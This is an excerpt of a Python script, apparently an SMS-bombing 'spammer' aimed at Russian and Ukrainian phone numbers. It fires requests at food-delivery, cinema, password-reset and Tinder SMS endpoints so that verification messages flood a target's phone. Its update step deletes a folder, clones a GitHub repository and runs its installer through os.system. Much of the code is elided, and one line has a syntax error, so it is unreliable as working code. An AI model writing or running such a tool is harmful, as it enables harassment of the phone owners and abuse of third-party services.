...
def main(t):
    ...
    if input1 == "1":
        logo()
        phone = input(
            Style.BRIGHT + Fore.BLUE + "Введите номер телефона: " + Style.RESET_ALL
        )
        if phone == "":
            main(0)
        if phone[0] == "+":
        ...
        elif phone[0] == "3" and phone[1] == "7" and phone[2] == "4"

            locale = "RU"
        elif (
            phone[0] == "3" and phone[1] == "8" and phone[2] == "0" and len(phone) == 12
        ):
            locale = "UA"
        else:
            logo()
            ...
            try:
                if locale == "RU":
                        ...
                        requests.post(
                            ...
                            json={
                                ...
                                "confirmationGDPRDate": int(
                                    str(datetime.datetime.now().timestamp()).split(".")[
                                        0
                                    ]
                                ),
                            },
                    ...
                    try:
                        phonee = mask(str=phone, maska="+# (###) ###-####")
                        requests.post(
                            "https://pizza46.ru/ajaxGet.php", data={"phone": phonee}
                        )
                    except:
                        pass
                    try:
                    ...
                    try:
                        phonee = mask(str=phone, maska="+# (###) ### ## ##")
                        requests.get(
                            f"http://mnogomenu.ru/office/password/reset/" + phonee
                        )
                    except:
                        pass
                    try:
                    ...
                    try:
                        phonee = mask(str=phone, maska="+# (###) ###-##-##")
                        requests.post(
                            "https://cinema5.ru/api/phone_code", data={"phone": phonee}
                        )
                    except:
                        pass
                    try:
                    ...
                    try:
                        phonee = mask(str=phone, maska="+# (###) ###-##-##")
                        requests.post(
                            "https://oauth.av.ru/check-phone", json={"phone": phonee}
                        )
                    except:
                        pass
                    try:
                    ...
                    try:
                        requests.post(
                            "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ua",
        ...
        if update == "y":
            os.system(
                "cd && rm -rf ~/spammer && git clone https://github.com/cludeex/spammer && python ~/spammer/install.py"
            )
            exit()
        else:
            logo()
